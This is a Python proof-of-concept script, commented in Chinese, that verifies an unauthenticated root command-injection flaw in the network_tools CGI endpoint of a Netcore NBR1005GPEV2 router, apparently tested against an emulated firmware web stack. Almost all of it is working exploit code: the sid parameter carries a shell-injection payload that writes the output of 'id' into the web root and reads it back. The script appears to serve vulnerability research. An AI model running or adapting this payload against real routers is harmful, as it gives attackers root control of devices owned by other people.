#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Netcore NBR1005GPEV2 - V1 network_tools 未授权 RCE - 手动一键验证
在 Windows 主机运行。

原理: 发一个未授权 GET 请求,让设备把 `id` 命令输出写到 web 根目录
      (/www/pwned_rce.txt),再通过 HTTP 把这个文件读回来。
      直接看到 uid=0(root) 就证明: 未授权 + root + 任意命令执行 (RCE)。

前提: 模拟 web 栈跑在 http://192.168.1.6:8080 (qemu-user+chroot 起的 uhttpd)

用法:  python verify_v1_rce.py
"""
import socket, urllib.request, time, sys
try:
    sys.stdout.reconfigure(encoding="utf-8", errors="replace")
except Exception:
    pass

TARGET  = "192.168.1.6"   # 虚拟机(模拟 web)
PORT    = 8080
OUTFILE = "aaaaa.txt" # 设备写到 /www/<这个文件>, 我们 HTTP 读回

print("[*] 目标: http://%s:%d" % (TARGET, PORT))
print("[*] 注入未授权命令执行 (id -> /www/%s) ..." % OUTFILE)

# 注入: eval 展开为  sid='a';id>/www/pwned_rce.txt;''
# (sid 鉴权检查在 eval 之后, 所以命令先执行; 响应虽返回 result:[6] 但命令已跑)
path = "/cgi-bin/network_tools?sid=a';id>/www/%s;'" % OUTFILE
s = socket.create_connection((TARGET, PORT), 5)
s.sendall(("GET %s HTTP/1.1\r\nHost: x\r\nConnection: close\r\n\r\n" % path).encode())
try:
    while s.recv(4096):
        pass
except Exception:
    pass
s.close()
time.sleep(1)

# 通过 HTTP 读回设备刚写的文件
try:
    data = urllib.request.urlopen(
        "http://%s:%d/%s" % (TARGET, PORT, OUTFILE), timeout=5
    ).read().decode(errors="replace").strip()
    print("\n[+] RCE 确认 — 设备以 root 执行了注入的命令, 输出写回 web 根并被读回:")
    print("    " + data)
    print("\n[+] 结论: 未授权任意命令执行 (uid=0 root) => V1 验证成功")
except Exception as e:
    print("[-] 读回失败(%s)。请确认模拟 web 栈在 http://%s:%d 运行。" % (e, TARGET, PORT))
